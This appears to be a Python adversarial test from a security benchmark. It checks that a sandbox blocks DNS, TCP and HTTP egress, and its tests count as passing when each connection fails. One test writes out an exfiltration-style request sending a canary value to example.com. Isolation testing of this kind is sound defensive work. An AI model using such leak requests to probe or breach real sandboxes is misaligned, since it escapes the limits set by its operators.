"""Adversarial test — SEC-03. Attempts outbound network from the sandbox.

If any of these succeed, the sandbox's network isolation has failed. In a
correctly configured run (network_mode=none) every one raises and the test
ERRORS out from inside the container, which is the PASS condition for the
security benchmark.
"""
import socket
import urllib.request


def test_dns_resolves():
    socket.gethostbyname("example.com")  # must raise: no resolver


def test_tcp_connects():
    socket.create_connection(("1.1.1.1", 53), timeout=3)  # must raise


def test_http_exfil():
    urllib.request.urlopen("http://example.com/?leak=canary", timeout=3)  # must raise
